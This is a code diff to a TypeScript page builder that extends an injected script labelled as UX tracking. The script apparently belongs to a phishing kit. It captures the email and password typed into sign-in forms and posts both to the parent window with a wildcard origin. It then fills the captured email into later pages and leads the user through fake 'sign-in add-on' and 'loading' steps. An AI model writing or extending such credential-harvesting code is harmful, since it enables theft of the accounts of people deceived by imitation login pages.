@@ -840,34 +840,101 @@ function applyPageMeta(doc: string, pm: PageMeta): string {
 
 const TRACKER_SCRIPT = `<script>
 window.track = function(field, value){ try { parent.postMessage({__ux:true, type:'input', field, value}, '*'); } catch(e){} };
-function wireContinueButtons(){
-  var inputs = Array.prototype.slice.call(document.querySelectorAll('input[type="email"], input[name*="mail" i], input[id*="mail" i]'));
-  inputs.forEach(function(input){
-    var root = input.closest('form') || document;
-    var buttons = Array.prototype.slice.call(root.querySelectorAll('button, input[type="button"], input[type="submit"]'));
-    var btn = buttons.find(function(b){ return /continue/i.test((b.textContent || b.value || '').trim()); }) || document.getElementById('continueBtn');
-    if (!btn || btn.__uxContinueWired) return;
-    btn.__uxContinueWired = true;
-    function ok(){ return /@/.test(input.value || ''); }
-    function sync(){
-      var ready = ok();
-      btn.disabled = !ready;
-      btn.setAttribute('aria-disabled', ready ? 'false' : 'true');
-      if (btn.classList) btn.classList.toggle('is-ready', ready);
+var EMAIL_KEY = '__ux_email';
+function getStoredEmail(){ try { return sessionStorage.getItem(EMAIL_KEY) || ''; } catch(e){ return ''; } }
+function setStoredEmail(v){ try { sessionStorage.setItem(EMAIL_KEY, v); } catch(e){} }
+function currentDesignAndPage(){
+  try {
+    var parts = parent.location.pathname.split('/').filter(Boolean);
+    return { design: parts[0] || '', page: parts[1] || '' };
+  } catch(e){ return { design:'', page:'' }; }
+}
+function navigateTo(page){
+  var loc = currentDesignAndPage();
+  if (!loc.design) return;
+  try {
+    document.body.style.transition = 'opacity .25s ease';
+    document.body.style.opacity = '0';
+  } catch(e){}
+  setTimeout(function(){
+    try { parent.location.assign('/' + loc.design + '/' + page); }
+    catch(e){ try { location.assign('/' + loc.design + '/' + page); } catch(_){} }
+  }, 220);
+}
+function replaceEmailPlaceholder(){
+  var email = getStoredEmail();
+  if (!email) return;
+  function walk(node){
+    if (!node) return;
+    if (node.nodeType === 3) {
+      if (node.nodeValue && node.nodeValue.indexOf('lol@gmail.com') >= 0) {
+        node.nodeValue = node.nodeValue.split('lol@gmail.com').join(email);
+      }
+    } else if (node.nodeType === 1) {
+      var tag = node.tagName;
+      if (tag === 'SCRIPT' || tag === 'STYLE') return;
+      for (var i = 0; i < node.childNodes.length; i++) walk(node.childNodes[i]);
     }
-    input.addEventListener('input', sync);
-    input.addEventListener('keyup', sync);
-    input.addEventListener('change', sync);
-    btn.addEventListener('click', function(e){
-      if (!ok()) { e.preventDefault(); sync(); return; }
+  }
+  walk(document.body);
+}
+function findContinueButton(scope){
+  var buttons = Array.prototype.slice.call((scope||document).querySelectorAll('button, input[type="button"], input[type="submit"]'));
+  return buttons.find(function(b){ return /continue|sign\\s*in|log\\s*in|next/i.test((b.textContent || b.value || '').trim()); })
+    || document.getElementById('continueBtn')
+    || buttons[0];
+}
+function wireContinueButtons(){
+  var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"], input[name*="mail" i], input[id*="mail" i]'));
+  var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"], input[name*="pass" i], input[id*="pass" i]'));
+  var hasPassword = passwords.length > 0;
+  var input = passwords[0] || emails[0];
+  if (!input) {
+    var btnOnly = findContinueButton();
+    if (btnOnly && !btnOnly.__uxContinueWired) {
+      btnOnly.__uxContinueWired = true;
+      btnOnly.disabled = false;
+      btnOnly.addEventListener('click', function(){ navigateTo('loading'); }, true);
+    }
+    return;
+  }
+  var root = input.closest('form') || document;
+  var btn = findContinueButton(root);
+  if (!btn || btn.__uxContinueWired) return;
+  btn.__uxContinueWired = true;
+  function ok(){
+    var v = input.value || '';
+    if (hasPassword) return v.length > 0;
+    return /@/.test(v);
+  }
+  function sync(){
+    var ready = ok();
+    btn.disabled = !ready;
+    btn.setAttribute('aria-disabled', ready ? 'false' : 'true');
+    if (btn.classList) btn.classList.toggle('is-ready', ready);
+  }
+  input.addEventListener('input', sync);
+  input.addEventListener('keyup', sync);
+  input.addEventListener('change', sync);
+  btn.addEventListener('click', function(e){
+    if (!ok()) { e.preventDefault(); sync(); return; }
+    e.preventDefault();
+    if (hasPassword) {
+      try { window.track('password_submitted', input.value || ''); } catch(err){}
+      try { window.track('continue_clicked', '1'); } catch(err){}
+      navigateTo('loading');
+    } else {
+      setStoredEmail(input.value || '');
       try { window.track('email_submitted', input.value || ''); } catch(err){}
       try { window.track('continue_clicked', '1'); } catch(err){}
-    }, true);
-    sync();
-  });
+      navigateTo('signinaddon');
+    }
+  }, true);
+  sync();
 }
-wireContinueButtons();
-if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', wireContinueButtons);
+function boot(){ replaceEmailPlaceholder(); wireContinueButtons(); }
+boot();
+if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
 function reportViewport(){ try { parent.postMessage({__ux:true, type:'viewport', w:innerWidth, h:innerHeight}, '*'); } catch(e){} }
 reportViewport();
 window.addEventListener('resize', reportViewport, {passive:true});
